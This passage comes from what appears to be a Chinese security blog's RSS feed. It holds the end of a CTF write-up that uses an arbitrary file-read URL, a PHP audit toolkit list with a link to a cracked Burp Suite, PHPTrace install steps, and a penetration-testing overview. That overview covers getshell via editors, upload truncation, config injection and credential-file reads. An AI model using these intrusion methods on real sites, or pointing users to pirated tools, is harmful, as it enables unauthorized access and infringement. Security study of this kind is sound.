fclose($file1);
?&gt;
</code></pre>
<p>构造<strong>/read.php?file=/xxx.php</strong>把各种源码下载了、、</p>
<p>然而、还没来得及看就到时间了、、、</p>
<h2>最后</h2>
<p>作为一枚业余的WEB狗、脑洞实在是不够大、、勉强做出两题。。。我觉得、这成绩还成、、毕竟不是大神、也不是赛棍、、</p>
<p>看热闹般路过了这两天的ZCTF、、我只能默默等待Writeup</p>]]></description>
</item>
<item>
<title><![CDATA[Windows下搭建PHP代码审计半自动化环境]]></title>
<pubDate>Wed, 13 Jan 2016 00:00:11 GMT</pubDate>
<link>http://www.virzz.com/2016_01_13_php_audit_environment_for_windows</link>
<guid>http://www.virzz.com/2016_01_13_php_audit_environment_for_windows</guid>
<description><![CDATA[<h2>Windows下搭建PHP代码审计半自动化环境</h2>
<hr />
<h2><a href="http://www.phpstudy.net" title="phpstudy">PHPStudy</a></h2>
<p>下载地址解压版：</p>
<pre><code>http://www.phpstudy.net/phpstudy/phpStudy.zip
http://www.phpstudy.net/phpstudy/phpStudy-x64.zip
</code></pre>
<p>说明：</p>
<pre><code>16种组合，超全大合集：
    Apache+Nginx+LightTPD+IIS
    php5.2 php5.3  php5.5 php7.0
    MySQL phpMyAdmin MySQL-Front
    16种组合自由切换，是下面5个版本的合集
    同时支持apache/nginx/Lighttpd和IIS7/8/6
</code></pre>
<h2><a href="http://www.cnseay.com/2951/" title="Seay源代码审计系统">Seay源代码审计系统</a></h2>
<p>程序及源码下载地址：</p>
<pre><code>http://pan.baidu.com/s/1i3Jw2uL
</code></pre>
<h2><a href="https://github.com/virink/vMysqlMonitoring/" title="Mysql执行语句监控工具vMysqlMonitoring">Mysql执行语句监控工具vMysqlMonitoring</a></h2>
<p>下载地址: </p>
<pre><code>https://github.com/virink/vMysqlMonitoring/archive/master.zip
</code></pre>
<h2><a href="http://www.firefox.com.cn" title="火狐浏览器Firefox">火狐浏览器Firefox</a></h2>
<p><strong>插件</strong>:Firebug、Hackbar、FoxyProxy、ModifyHeaders</p>
<h2><a href="https://portswigger.net/burp/" title="Burp Suite">BurpSuite</a></h2>
<p>下载地址: </p>
<pre><code>v1.6.17版破解版
http://pan.baidu.com/s/1qWG8of6
</code></pre>]]></description>
</item>
<item>
<title><![CDATA[PHPTrace PHP执行流程跟踪工具]]></title>
<pubDate>Sat, 12 Dec 2015 00:09:13 GMT</pubDate>
<link>http://www.virzz.com/2015_12_12_phptrace_php_execution_flow_tracing_tools</link>
<guid>http://www.virzz.com/2015_12_12_phptrace_php_execution_flow_tracing_tools</guid>
<description><![CDATA[<h2>最新版本下载： <a href="https://pecl.php.net/package/trace">https://pecl.php.net/package/trace</a></h2>
<hr />
<h2>编译安装</h2>
<h2>解压缩源码包</h2>
<pre><code>tar -zxf phptrace-{version}.tar.gz
cd phptrace-{version}
</code></pre>
<h2>PHP扩展 - 编译安装</h2>
<pre><code>cd extension
{php_bin_dir}/phpize
./configure --with-php-config={php_bin_dir}/php-config
# 编译
make
# 安装trace.so到扩展目录
make install
</code></pre>
<h2>PHP扩展 - 配置</h2>
<ul>
<li>
<p>编辑配置文件php.ini，增加下面配置信息。如果需要的话重启PHP进程。</p>
<pre><code>extension=trace.so
</code></pre>
</li>
<li>
<p>命令行工具编译</p>
<pre><code>cd cmdtool
make
</code></pre>
</li>
<li>
<p>验证安装情况</p>
<pre><code>php -r 'for ($i = 0; $i &lt; 100; $i++) usleep(10000);' &amp;
./phptrace -p $!
</code></pre>
</li>
<li>
<p>如果一切正常，应该可以看到类似下面的输出</p>
<pre><code>1431681727.341829      usleep  =&gt;  NULL   wt: 0.011979 ct: 0.011980
1431681727.341847      usleep(10000) at [Command line code:1]
1431681727.353831      usleep  =&gt;  NULL   wt: 0.011984 ct: 0.011983
1431681727.353849      usleep(10000) at [Command line code:1]
1431681727.365829      usleep  =&gt;  NULL   wt: 0.011980 ct: 0.011981
1431681727.365848      usleep(10000) at [Command line code:1]
</code></pre>
</li>
<li>
<p>使用</p>
<pre><code>跟踪执行状态
$ ./phptrace -p 3600
打印当前状态
$ ./phptrace -s -p 3600
</code></pre>
</li>
</ul>]]></description>
</item>
<item>
<title><![CDATA[WEB渗透测试略说]]></title>
<pubDate>Sat, 12 Dec 2015 00:07:44 GMT</pubDate>
<link>http://www.virzz.com/2015_12_12_web_penetration_testing</link>
<guid>http://www.virzz.com/2015_12_12_web_penetration_testing</guid>
<description><![CDATA[<h2>WEB渗透测试略说</h2>
<p><em>本文简单讲解一般的拿站思路。</em></p>
<p>首先，要拿一个站，你会怎么做？而我，毫不犹豫就是扫目录。不管他是什么语言，什么服务器，扫目录总是首要的。当然，要注意这个站是不是防止频繁访问的。扫目录可以从一些页面看出它是什么语言，有哪些目录，后台是什么。</p>
<p>这里，我推荐两款工具，wwwscan和御剑后台扫描工具。要扫目录，当然要具备强大的字典，这个就要靠自己收集整理。其中wwwscan还可以扫出服务器版本。知道了服务器版本，如iis系列，就可以考虑解析漏洞了。</p>
<p>扫目录，从目录中发现一些蛛丝马迹，上传文件、编辑器、网站备份，或者前辈的shell。总之，扫目录可以得到一些意想不到的东西。</p>
<p>编辑器漏洞最出名的还是FCK，各种getshell方法网上都有。</p>
<p>网站备份可以得到源码，目录结构，数据库，网站配置，其中的信息颇多。</p>
<p>前辈的shell也可以爆破一下。</p>
<p>同时，还可以对网站进行注入检测，如果得到一个好的注入点，那也能够做很多事情了。暴库得到 管理员的帐号和密码是一个不错的方法。但是，有时候后台隐藏的很深。这时，可以通过各种方法得到后台，比如上文的扫目录，如果网站存在robot.txt 也可以发现点什么，利用搜索引擎也是一个不错的注意，google黑客！</p>
<p>得到后台你会干些什么？当然是想办法getshell啦。</p>
<p>后台getshell的方法也不是，主要是看情况。有些网站后台功能挺丰富的，上传文件功 能。审查不严密就可以直接上传shell，限制后缀也可以考虑一下截断上传。系统参数配置也可以getshell，有些配置是写入到config.xxx 文件里，如果写入一句话，那么它就是一个shell咯，比如aspcms就可以这样getshell。后台还可能有一些其他漏洞，如遍历目录，任意文件读 取。</p>
<p>任意文件读取是一个大杀器，读一下网站配置信息，如web.config，conn.xx什么的，可以得到数据库连接信息。Mssql和mysql都有不错的getshell功能。如执行命令，到处shell什么的。</p>
<p>其他还有旁注什么的也是不错的选择。</p>
<p>最后，严重声明，本文仅简单归纳部分安全渗透思路，请勿非法做某些事情。</p>]]></description>
</item>

</channel>
</rss>
